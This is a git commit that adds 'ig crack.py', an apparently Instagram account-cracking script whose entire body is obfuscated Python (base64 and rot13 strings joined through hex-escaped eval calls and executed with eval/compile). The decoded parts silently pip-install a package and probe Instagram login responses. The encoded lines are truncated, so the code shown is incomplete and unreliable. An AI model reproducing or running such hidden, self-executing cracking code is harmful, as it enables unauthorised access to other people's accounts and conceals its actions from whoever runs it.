6eb509cc3fabf9caf085284a3bc43392c16557ef
Saheer <102059565+saheer-404@users.noreply.github.com>
2022-11-13 09:29:53 +0530

    Add files via upload

---
+++ ig crack.py
@@ -0,0 +1,8 @@
+import base64, codecs
+magic = 'aW1wb3J0IG9zCnRyeToKIGltcG9ydCBpbnN0YWxvYWRlcgpleGNlcHQ6CiBpbXBvcnQgb3MKIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgaW5zdGFsb2FkZXIiKQpvcy5zeXN0ZW0oImNsZWFyIikKcHJpbnQ>
+love = 'VvVgVSAHDIEIHlOGD1WWHSDtBvODHxIAFIIAVvVvXDcjpzyhqPtv4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO4cFO>
+god = 'lIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEiKQoKZGVmIG1haW4oKToKICByZXMgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vaW5zdGFncmFtLmNvbSIpCiAgc>
+destiny = 'pzImVQ0tpzIkqJImqUZhM2I0XPWbqUEjpmbiY2yhp3EuM3WuoF5wo20vXDbtVPNtpUWcoaDbpzImXDbtVPNtpUWcoaDbVyOup3A3o3WxVTymVTyhL29lpzIwqPVfIIASHvjvBvVfHRSGHlxXPaWyplN9V>
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64>
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
